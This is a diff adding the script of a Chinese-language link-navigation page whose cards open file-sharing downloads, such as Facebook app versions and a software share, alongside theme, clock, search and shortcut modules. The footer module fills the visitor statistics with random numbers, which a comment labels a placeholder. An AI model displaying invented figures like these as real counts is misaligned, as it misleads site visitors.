+          icon: '<svg viewBox="0 0 24 24" fill="currentColor"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm9 14H6V10h12v10zm-6-3c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2z"/></svg>',
+        },
+        {
+          key: 'fb-versions',
+          num: '05',
+          title: '脸书全版本',
+          subtitle: 'FB Versions',
+          desc: '各版本 FB 下载，密码：6666。',
+          url: 'https://wwq.lanzouo.com/b0138yob6j',
+          currentWindow: false,
+          icon: '<svg viewBox="0 0 24 24" fill="currentColor"><path d="M21 2H3c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h7l-2 3v1h8v-1l-2-3h7c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 12H3V4h18v10z"/></svg>',
+        },
+        {
+          key: 'software-download',
+          num: '06',
+          title: '软件下载',
+          subtitle: 'Software Download',
+          desc: '海量软件资源，便捷获取。',
+          url: 'https://wwwh.qyshare.com:2999/s/6q90gz',
+          currentWindow: false,
+          icon: '<svg viewBox="0 0 24 24" fill="currentColor"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>',
+        },
+      ],
+    };
+
+    /* ------------------------------------------------------------
+       卡片渲染 + 3D 倾斜 + 鼠标跟随光效 + 点击波纹 + 加载跳转
+       ------------------------------------------------------------ */
+    const CardsModule = (function () {
+      const container = document.getElementById('cards');
+      const tiltEnabled = window.matchMedia('(hover: hover) and (min-width: 768px)').matches;
+      const MAX_TILT = 6;
+      const TOTAL = CONFIG.cards.length;
+      const LOADER_DELAY = 800;
+
+      function render() {
+        const totalStr = String(TOTAL).padStart(2, '0');
+        container.innerHTML = CONFIG.cards.map((c) => `
+          <article class="card" data-key="${c.key}" data-url="${c.url}" data-current="${c.currentWindow}" tabindex="0" role="link" aria-label="进入${c.title}工具">
+            <div class="card-glow" aria-hidden="true"></div>
+            <div class="card-inner">
+              <div class="card-head">
+                <div class="card-icon" aria-hidden="true">${c.icon}</div>
+                <span class="card-num">${c.num} / ${totalStr}</span>
+              </div>
+              <h2 class="card-title">${c.title}</h2>
+              <p class="card-subtitle">${c.subtitle}</p>
+              <p class="card-desc">${c.desc}</p>
+              <span class="card-enter">
+                进入
+                <span class="arrow">
+                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+                </span>
+                <span class="card-loader" aria-hidden="true"></span>
+              </span>
+            </div>
+          </article>
+        `).join('');
+        bindEvents();
+      }
+
+      function bindEvents() {
+        container.querySelectorAll('.card').forEach((card) => {
+          if (tiltEnabled) {
+            card.addEventListener('mousemove', (e) => handleMouseMove(e, card));
+            card.addEventListener('mouseleave', () => resetCard(card));
+          }
+
+          const trigger = (e) => {
+            if (card.classList.contains('loading')) return;
+            createRipple(e, card);
+            card.classList.add('pressed', 'loading');
+            setTimeout(() => card.classList.remove('pressed'), 180);
+
+            const url = card.dataset.url;
+            const currentWindow = card.dataset.current === 'true';
+
+            setTimeout(() => {
+              card.classList.remove('loading');
+              if (currentWindow) {
+                window.location.href = url;
+              } else {
+                window.open(url, '_blank');
+              }
+            }, LOADER_DELAY);
+          };
+
+          card.addEventListener('click', trigger);
+          card.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter' || e.key === ' ') {
+              e.preventDefault();
+              trigger(e);
+            }
+          });
+        });
+      }
+
+      function handleMouseMove(e, card) {
+        const rect = card.getBoundingClientRect();
+        const x = e.clientX - rect.left;
+        const y = e.clientY - rect.top;
+        const px = (x / rect.width) * 100;
+        const py = (y / rect.height) * 100;
+
+        card.style.setProperty('--mx', px + '%');
+        card.style.setProperty('--my', py + '%');
+
+        const rotateY = ((px / 100) - 0.5) * 2 * MAX_TILT;
+        const rotateX = -((py / 100) - 0.5) * 2 * MAX_TILT;
+        card.style.transform =
+          `perspective(1000px) rotateX(${rotateX.toFixed(2)}deg) rotateY(${rotateY.toFixed(2)}deg) translateY(-5px)`;
+      }
+
+      function resetCard(card) {
+        card.style.transform = '';
+        card.style.setProperty('--mx', '50%');
+        card.style.setProperty('--my', '50%');
+      }
+
+      function createRipple(event, card) {
+        const rect = card.getBoundingClientRect();
+        const size = Math.max(rect.width, rect.height);
+        const x = (event.clientX || rect.left + rect.width / 2) - rect.left - size / 2;
+        const y = (event.clientY || rect.top + rect.height / 2) - rect.top - size / 2;
+        const ripple = document.createElement('span');
+        ripple.className = 'ripple';
+        ripple.style.width = ripple.style.height = size + 'px';
+        ripple.style.left = x + 'px';
+        ripple.style.top = y + 'px';
+        card.appendChild(ripple);
+        ripple.addEventListener('animationend', () => ripple.remove());
+      }
+
+      return { render, container };
+    })();
+
+    /* ------------------------------------------------------------
+       主题切换：默认暗色，localStorage 持久化
+       ------------------------------------------------------------ */
+    const ThemeModule = (function () {
+      const toggle = document.getElementById('themeToggle');
+      const KEY = '小豆-theme';
+
+      function init() {
+        const saved = localStorage.getItem(KEY);
+        if (saved) apply(saved);
+        toggle.addEventListener('click', switchTheme);
+      }
+
+      function apply(theme) {
+        document.documentElement.setAttribute('data-theme', theme);
+      }
+
+      function switchTheme() {
+        const next = document.documentElement.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+        apply(next);
+        localStorage.setItem(KEY, next);
+      }
+
+      return { init };
+    })();
+
+    /* ------------------------------------------------------------
+       实时时钟
+       ------------------------------------------------------------ */
+    const ClockModule = (function () {
+      const dateEl = document.getElementById('clockDate');
+      const timeEl = document.getElementById('clockTime');
+      const weekdays = ['周日', '周一', '周二', '周三', '周四', '周五', '周六'];
+      const pad = (n) => (n < 10 ? '0' + n : '' + n);
+
+      function tick() {
+        const now = new Date();
+        dateEl.textContent = `${now.getMonth() + 1}月${now.getDate()}日 ${weekdays[now.getDay()]}`;
+        timeEl.textContent = `${pad(now.getHours())}:${pad(now.getMinutes())}:${pad(now.getSeconds())}`;
+      }
+
+      function init() {
+        tick();
+        setInterval(tick, 1000);
+      }
+
+      return { init };
+    })();
+
+    /* ------------------------------------------------------------
+       搜索高亮：匹配中英文关键词
+       ------------------------------------------------------------ */
+    const SearchModule = (function () {
+      const input = document.getElementById('searchInput');
+
+      function init() {
+        input.addEventListener('input', handleInput);
+      }
+
+      function handleInput(e) {
+        const kw = e.target.value.trim().toLowerCase();
+        const list = document.querySelectorAll('.card');
+
+        if (!kw) {
+          list.forEach((c) => c.classList.remove('match', 'dim'));
+          return;
+        }
+
+        let firstMatch = null;
+        list.forEach((c) => {
+          const title = (c.querySelector('.card-title').textContent || '').toLowerCase();
+          const subtitle = (c.querySelector('.card-subtitle').textContent || '').toLowerCase();
+          const desc = (c.querySelector('.card-desc').textContent || '').toLowerCase();
+          const key = (c.dataset.key || '').toLowerCase();
+          const matched = title.includes(kw) || subtitle.includes(kw) ||
+            desc.includes(kw) || key.includes(kw);
+
+          c.classList.toggle('match', matched);
+          c.classList.toggle('dim', !matched);
+          if (matched && !firstMatch) firstMatch = c;
+        });
+
+        if (firstMatch) {
+          firstMatch.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        }
+      }
+
+      return { init };
+    })();
+
+    /* ------------------------------------------------------------
+       快捷键：Alt + 1 ~ 6
+       ------------------------------------------------------------ */
+    const ShortcutModule = (function () {
+      const KEYS = ['1', '2', '3', '4', '5', '6'];
+
+      function init() {
+        document.addEventListener('keydown', handleKey);
+      }
+
+      function handleKey(e) {
+        if (!e.altKey) return;
+        const idx = KEYS.indexOf(e.key);
+        if (idx === -1) return;
+
+        e.preventDefault();
+        const card = CONFIG.cards[idx];
+        if (!card) return;
+
+        const el = document.querySelector(`.card[data-key="${card.key}"]`);
+        if (el) {
+          el.classList.add('match');
+          setTimeout(() => el.classList.remove('match'), 600);
+        }
+
+        setTimeout(() => {
+          if (card.currentWindow) {
+            window.location.href = card.url;
+          } else {
+            window.open(card.url, '_blank');
+          }
+        }, 200);
+      }
+
+      return { init };
+    })();
+
+    /* ------------------------------------------------------------
+       返回顶部 + Header 滚动状态
+       ------------------------------------------------------------ */
+    const ScrollModule = (function () {
+      const backTop = document.getElementById('backTop');
+      const header = document.getElementById('header');
+
+      function init() {
+        window.addEventListener('scroll', handle, { passive: true });
+      }
+
+      function handle() {
+        const y = window.scrollY;
+        backTop.classList.toggle('show', y > 320);
+        header.classList.toggle('scrolled', y > 8);
+      }
+
+      return { init };
+    })();
+
+    /* ------------------------------------------------------------
+       加载进度条
+       ------------------------------------------------------------ */
+    const ProgressModule = (function () {
+      const bar = document.getElementById('progress');
+
+      function init() {
+        bar.classList.add('active');
+        let p = 0;
+        const step = () => {
+          p += Math.random() * 16 + 8;
+          if (p >= 100) {
+            bar.style.width = '100%';
+            setTimeout(() => {
+              bar.classList.remove('active');
+              bar.style.width = '0';
+            }, 450);
+            return;
+          }
+          bar.style.width = p + '%';
+          requestAnimationFrame(step);
+        };
+        requestAnimationFrame(step);
+      }
+
+      return { init };
+    })();
+
+    /* ------------------------------------------------------------
+       Footer 年份 + 访问统计占位
+       ------------------------------------------------------------ */
+    const FooterModule = (function () {
+      function init() {
+        document.getElementById('year').textContent = new Date().getFullYear();
+
+        const rand = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
+        document.getElementById('statVisit').textContent = rand(120, 880).toLocaleString();
+        document.getElementById('statTotal').textContent = rand(86000, 128000).toLocaleString();
+      }
+
+      return { init };
+    })();
+
+    /* ------------------------------------------------------------
+       初始化
+       ------------------------------------------------------------ */
+    document.addEventListener('DOMContentLoaded', () => {
+      CardsModule.render();
+      ThemeModule.init();
+      ClockModule.init();
+      SearchModule.init();
+      ShortcutModule.init();
+      ScrollModule.init();
+      ProgressModule.init();
+      FooterModule.init();
+    });
+  </script>
+</body>
+</html>
